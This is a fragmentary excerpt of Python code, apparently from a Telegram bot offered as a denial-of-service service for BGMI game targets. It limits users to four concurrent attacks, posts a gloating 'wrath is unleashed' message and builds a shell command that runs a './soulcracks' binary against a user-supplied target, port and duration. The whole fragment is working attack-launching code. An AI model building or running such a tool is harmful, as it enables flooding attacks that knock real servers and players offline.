...
def handle_bgmi(message):
    ...
    if len(current_active) >= 4:
        bot.reply_to(message, "🚨 Maximum of 4 concurrent attacks allowed. Please wait for some to finish before launching a new attack.")
        return
...
🔥 **The wrath is unleashed. May the network shatter!** 🔥
    ...
    # Build the command to run your binary using only 2 vCPUs (cores 0 and 1)
    full_command = f"nice -n -20 taskset -c 0,1 ./soulcracks {target} {port} {duration}"
    try:
